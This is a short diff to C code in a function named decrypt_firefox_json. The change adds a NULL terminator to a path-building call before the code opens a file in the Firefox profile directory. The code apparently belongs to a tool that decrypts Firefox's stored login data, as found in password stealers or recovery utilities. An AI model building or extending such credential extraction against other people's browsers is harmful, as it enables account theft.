@@ -133,7 +133,7 @@ VOID decrypt_firefox_json()
 	CHAR tmp_buff[255];
 	CHAR* tmp_file;
 	LPSTR strProfilePath = GetFirefoxProfilePath();
-	tmp_file = dupcat(strProfilePath, "\\", strFileName);
+	tmp_file = dupcat(strProfilePath, "\\", strFileName, NULL);
 
 	if ((hFile = CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
 	{
